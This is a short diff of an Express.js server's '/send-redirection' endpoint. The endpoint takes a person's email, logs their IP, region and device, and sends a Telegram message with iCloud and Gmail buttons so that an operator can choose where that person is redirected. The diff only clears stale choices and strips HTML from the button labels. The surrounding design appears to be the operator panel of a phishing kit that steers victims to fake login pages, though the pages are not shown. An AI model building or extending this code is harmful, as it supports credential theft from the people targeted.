@@ -565,6 +565,11 @@ app.post("/send-redirection", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
+    // ✅ CLEAR any previous choice for this email
+    if (pendingRedirection[email]) {
+      delete pendingRedirection[email];
+    }
+
     // Detect region and device from request
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
       req.headers["x-real-ip"] ||
@@ -598,8 +603,8 @@ app.post("/send-redirection", async (req, res) => {
         parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
-            [{ text: "☁️ <b>iCloud</b> ☁️", callback_data: `redirect_icloud|${email}` }],
-            [{ text: "🌈 <b>Gmail</b> 🌈", callback_data: `redirect_gmail|${email}` }]
+            [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
+            [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
           ]
         }
       })
